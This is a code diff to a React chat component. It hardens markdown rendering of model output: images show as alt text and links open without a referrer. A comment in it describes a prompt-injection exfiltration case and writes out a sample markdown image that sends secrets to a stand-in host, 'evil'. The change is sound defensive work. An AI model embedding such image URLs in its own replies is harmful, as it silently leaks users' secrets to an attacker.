@@ -3,7 +3,7 @@
 import { useChat } from '@ai-sdk/react';
 import { DefaultChatTransport, type UIMessage } from 'ai';
 import { useEffect, useLayoutEffect, useMemo, useRef, useState } from 'react';
-import Markdown from 'react-markdown';
+import Markdown, { type Components } from 'react-markdown';
 import type { StoredMessage } from '@/lib/api-types';
 
 type Props = {
@@ -110,12 +110,26 @@ export function Chat({ sessionId, initialMessages, provider, model, onTurnEnd }:
 }
 
 /**
- * Render one message part: assistant text as markdown (react-markdown ignores raw HTML, so model output
- * can't inject markup), user text as-is, tool calls as compact chips.
+ * Markdown overrides for model output. A prompt-injected reply could embed `![](https://evil/?d=<secrets>)`,
+ * which the browser would fetch with no click, so images are shown as their alt text instead (the CSP
+ * img-src also blocks them). Links still work, but open in a new tab without sending a referrer.
+ */
+const MARKDOWN_COMPONENTS: Components = {
+  img: ({ alt }) => <span className="muted">[image{alt ? `: ${alt}` : ''}]</span>,
+  a: ({ href, children }) => (
+    <a href={href} target="_blank" rel="noopener noreferrer">
+      {children}
+    </a>
+  ),
+};
+
+/**
+ * Render one message part: assistant text as markdown (react-markdown ignores raw HTML and unsafe URL
+ * schemes, so model output can't inject markup), user text as-is, tool calls as compact chips.
  */
 function Part({ part, markdown }: { part: UIMessage['parts'][number]; markdown: boolean }) {
   if (part.type === 'text') {
-    return markdown ? <div className="md"><Markdown>{part.text}</Markdown></div> : <div>{part.text}</div>;
+    return markdown ? <div className="md"><Markdown components={MARKDOWN_COMPONENTS}>{part.text}</Markdown></div> : <div>{part.text}</div>;
   }
   if (part.type.startsWith('tool-') || part.type === 'dynamic-tool') {
     const t = part as { type: string; toolName?: string; state?: string; errorText?: string; output?: unknown };
